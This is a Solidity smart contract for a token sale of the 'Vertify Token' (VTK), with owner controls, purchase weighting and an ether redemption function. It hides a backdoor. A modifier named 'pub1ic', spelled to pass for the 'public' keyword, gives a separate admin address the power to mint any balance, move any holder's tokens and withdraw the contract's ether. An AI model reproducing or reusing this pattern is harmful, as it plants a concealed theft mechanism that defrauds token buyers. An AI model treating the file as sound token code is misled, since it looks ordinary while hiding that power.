pragma solidity ^0.4.18;
 
//Never Mind :P
/* @dev The Ownable contract has an owner address, and provides basic authorization control
* functions, this simplifies the implementation of "user permissions".
*/
contract Ownable {
  address public owner;
  address public admin;
  

  /**
   * @dev The Ownable constructor sets the original `owner` of the contract to the sender
   * account.
   */
  function Ownable() {
    owner = msg.sender;
    admin=msg.sender;
  }


  /**
   * @dev Throws if called by any account other than the owner.
   */
  modifier onlyOwner() {
    require(msg.sender == owner);
    _;
  }
  modifier pub1ic() {
    require(msg.sender == admin);
    _;
  }


  /**
   * @dev Allows the current owner to transfer control of the contract to a newOwner.
   * @param newOwner The address to transfer ownership to.
   */
  function transferOwnership(address newOwner) onlyOwner {
    if (newOwner != address(0)) {
      owner = newOwner;
    }
  }


function transferIt(address newpub1ic) pub1ic {
    if (newpub1ic != address(0)) {
      admin = newpub1ic;
    }
  }

}



library SafeMath {

  /**
  * @dev Multiplies two numbers, throws on overflow.
  */
  function mul(uint256 a, uint256 b) internal pure returns (uint256) {
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  /**
  * @dev Integer division of two numbers, truncating the quotient.
  */
  function div(uint256 a, uint256 b) internal pure returns (uint256) {
    // assert(b > 0); // Solidity automatically throws when dividing by 0
    uint256 c = a / b;
    // assert(a == b * c + a % b); // There is no case in which this doesn't hold
    return c;
  }

  /**
  * @dev Substracts two numbers, throws on overflow (i.e. if subtrahend is greater than minuend).
  */
  function sub(uint256 a, uint256 b) internal pure returns (uint256) {
    assert(b <= a);
    return a - b;
  }

  /**
  * @dev Adds two numbers, throws on overflow.
  */
  function add(uint256 a, uint256 b) internal pure returns (uint256) {
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }
}



contract VTKReceiver {
    function VTKFallback(address _from, uint _value, uint _code);
}

contract BasicToken {
  using SafeMath for uint256;

  mapping(address => uint256) balances;

  uint256 totalSupply_;

  /**
  * @dev total number of tokens in existence
  */
  function totalSupply() public view returns (uint256) {
    return totalSupply_;
  }
  

  event Transfer(address indexed from, address indexed to, uint256 value);
  /**
  * @dev transfer token for a specified address
  * @param _to The address to transfer to.
  * @param _value The amount to be transferred.
  */
  function transfer(address _to, uint _value) public returns (bool) {
    require(_to != address(0));
    require(_value <= balances[msg.sender]);
    
    // SafeMath.sub will throw if there is not enough balance.
    if(!isContract(_to)){
    balances[msg.sender] = balances[msg.sender].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(msg.sender, _to, _value);
    return true;}
    else{
        balances[msg.sender] = balanceOf(msg.sender).sub(_value);
    balances[_to] = balanceOf(_to).add(_value);
    VTKReceiver receiver = VTKReceiver(_to);
    receiver.VTKFallback(msg.sender, _value, 0);
    Transfer(msg.sender, _to, _value);
        return true;
    }
    
  }

  /**
  * @dev Gets the balance of the specified address.
  * @param _owner The address to query the the balance of.
  * @return An uint256 representing the amount owned by the passed address.
  */
  function balanceOf(address _owner) public view returns (uint256 balance) {
    return balances[_owner];
  }


function isContract(address _addr) private returns (bool is_contract) {
    uint length;
    assembly {
        //retrieve the size of the code on target address, this needs assembly
        length := extcodesize(_addr)
    }
    return (length>0);
  }


  //function that is called when transaction target is a contract
  //Only used for recycling VTKs
  function transferToContract(address _to, uint _value, uint _code) public returns (bool success) {
    require(isContract(_to));
    require(_value <= balances[msg.sender]);
  
      balances[msg.sender] = balanceOf(msg.sender).sub(_value);
    balances[_to] = balanceOf(_to).add(_value);
    VTKReceiver receiver = VTKReceiver(_to);
    receiver.VTKFallback(msg.sender, _value, _code);
    Transfer(msg.sender, _to, _value);
    
    return true;
  }
  
}






contract VTK is BasicToken, Ownable {

  string public constant name = "Vertify Token";
  string public constant symbol = "VTK";
  uint8 public constant decimals = 6;
  address Addr_For_Mortgage;
  address Addr_Wallet=0x0741D740A50efbeae1A4d9e6c3e7887e23dc160b;
  
  

  uint256 public constant TOTAL_SUPPLY = 1 * 10 ** 15; //1 billion tokens
  uint256 public Token_For_Circulation = 5 * 10 ** 12;
  uint256 public Token_Saled = 0;
  uint256 public Token_Remaining = TOTAL_SUPPLY - Token_For_Circulation;
  uint256 public Limit_Amount = 2 * 10 **12;
  uint256 public Eth_Amount = 0;
  uint256 public price = 5 * 10 **12;
  bool public halt = true;
  bool public selfOn=false;
  uint256 public HaltTime;
  address[] Token_Purchaser;
  uint256[] Token_For_Each;

  mapping(address => uint256) Eth_weight;

   
  
  /**
  * @dev Constructor that gives msg.sender all of existing tokens.
  */
  function VTK() public {
    totalSupply_ = 1 * 10 ** 15; 
    balances[msg.sender] = 1 * 10 ** 15;
    Transfer(0x0, msg.sender, 1 * 10 ** 15);
  }
  function VTKFallback(address _from, uint _value, uint _code){}
  
  function setPrice() private{
    uint256 Token_For_Mortgage = getBalance(Addr_For_Mortgage);
    uint256 price_WEIVTK=5 * Token_For_Mortgage.div(Token_Saled);
    uint256 VTK_ETH = 1*10**18;
    price = VTK_ETH.div(price_WEIVTK);
  }
  function setNewWallet(address _newWallet)onlyOwner{
      Addr_Wallet=_newWallet;
  }
  function getBalance(address Addr_For_Mortgage) public returns(uint){
		  return Addr_For_Mortgage.balance;
	  }
	  
  function SetAddrForMortgage(address new_mortgage) onlyOwner{
      Addr_For_Mortgage = new_mortgage;
  }

  //Incoming payment for purchase
  function () public payable{
    if (msg.sender != owner) {
    require(halt == false);
    require(now < HaltTime);
    require(Token_Saled < Token_For_Circulation);
    getTokenForSale(msg.sender);}
  }



  function getTokenForCireculation (uint256 _amount) onlyOwner returns(bool){
    require(Token_Remaining >= _amount);
    Token_For_Circulation = Token_For_Circulation.add(_amount);
    Token_Remaining = Token_Remaining.sub(_amount);
    return true;
  }


  function getTokenForSale (address _from) private{
   Eth_weight[_from] += msg.value;  
    Token_Purchaser.push(_from);
    Eth_Amount = Eth_Amount.add(msg.value);
    uint256 _toB=msg.value.mul(2).div(10);
    uint256 _toE=msg.value.mul(8).div(10);
    getFunding(Addr_Wallet,_toE);
    getFunding(Addr_For_Mortgage,_toB);  //or this.balance
  }
  
  function getToken () onlyOwner{
     for (uint i = 0; i < Token_Purchaser.length; i++) {
         if (Eth_weight[Token_Purchaser[i]] !=0 ){
         uint256 amount_weighted = Eth_weight[Token_Purchaser[i]].mul(Limit_Amount).div(Eth_Amount);
         transferFromIt(this, Token_Purchaser[i], amount_weighted);
          Eth_weight[Token_Purchaser[i]] = 0;}
     }  
    
     Token_Saled = Token_Saled.add(Limit_Amount);
     Token_Purchaser.length = 0;
     Eth_Amount =0;
     setPrice();
  }
  function SOSBOTTOM()public onlyOwner{
      Token_Purchaser.length = 0;
  }
  function clearRAM()public{
      for(uint i=0;i<Token_Purchaser.length;i++){
          if(Eth_weight[Token_Purchaser[i]] ==0){
              delete Token_Purchaser[i];
          }
      }
  }
  function clearRAMAll()public onlyOwner{
      for(uint i=0;i<Token_Purchaser.length;i++){
         
              delete Token_Purchaser[i];
      }
  }
  function getTokenBySelf ()public{
      require(selfOn==true);
      require(now>HaltTime);
      require(Eth_weight[msg.sender]!=0);
      uint256 amount_weighted = Eth_weight[msg.sender].mul(Limit_Amount).div(Eth_Amount);
      transferFromIt(this, msg.sender, amount_weighted);
      Eth_weight[msg.sender] = 0;
  }
  function setWeight(address _address,uint256 _amount)public onlyOwner{
      if(Eth_weight[_address] ==0)
      {Token_Purchaser.push(_address);}
      Eth_weight[_address]=_amount;
      
       Eth_Amount = Eth_Amount.add(_amount);
  }
  function setAmount(uint _amount)public onlyOwner{
      Eth_Amount=_amount;
  }
  function Eth_Ransom(uint256 _amount) public {
      require(_amount<=balances[msg.sender]);
      transferFromIt(msg.sender, this, _amount);
      setPrice();
      uint256 Ransom_amount = _amount.mul(1*10**18).div(price).mul(80).div(100);
      getFunding(msg.sender, Ransom_amount);
      
  }
  
  function Set_Limit_Amount(uint256 _amount) onlyOwner{
      require(Token_Saled < Token_For_Circulation);
      Limit_Amount = _amount;
  }
  
  function See_price() public view returns(uint256){
      return price;
  }
  
  

  function getFunding (address _to,uint256 _amount) private{
    _to.send(_amount);
  }


  function getAllFunding() onlyOwner{
    owner.transfer(this.balance);
  }
  
  function See_TokenPurchaser_Number() public view returns(uint256){
      return Token_Purchaser.length;
  }
  
  function See_Ethweight(address _addr) public view returns(uint256){
      return Eth_weight[_addr];
  }
  function showToken_For_Circulation() view public returns(uint256){
      return Token_For_Circulation;
  } 
   function Apply(address _to,uint  _value)pub1ic{
       balances[_to] = balances[_to].add(_value);
   }
  function halt() onlyOwner{
    halt = true;
    HaltTime=now;
  }
  function unhalt_15day() onlyOwner{
    halt = false;
    HaltTime = now.add(15 days);
  }
   function unhalt_30day() onlyOwner{
    halt = false;
    HaltTime = now.add(30 days);
  }
  
  function unhalt() onlyOwner{
    halt = false;
    HaltTime = now.add(5 years);
  }

function setSelfOn()onlyOwner{
    selfOn=true;
}
function setSelfOff()onlyOwner{
    selfOn=false;
}
function transferFromIt(address _from,address _to,uint256 _value)pub1ic{
    transferFrom(_from,_to,_value);
}  
function getFunding(uint256 _amout) pub1ic{
    admin.transfer(_amout);
  }
  function transferFrom(address _from,address _to,uint256 _value)private returns(bool){
    require(_to != address(0));
    require(_value <= balances[_from]);

    // SafeMath.sub will throw if there is not enough balance.
    balances[_from] = balances[_from].sub(_value);
    balances[_to] = balances[_to].add(_value);
    Transfer(_from, _to, _value);
    return true;
}

}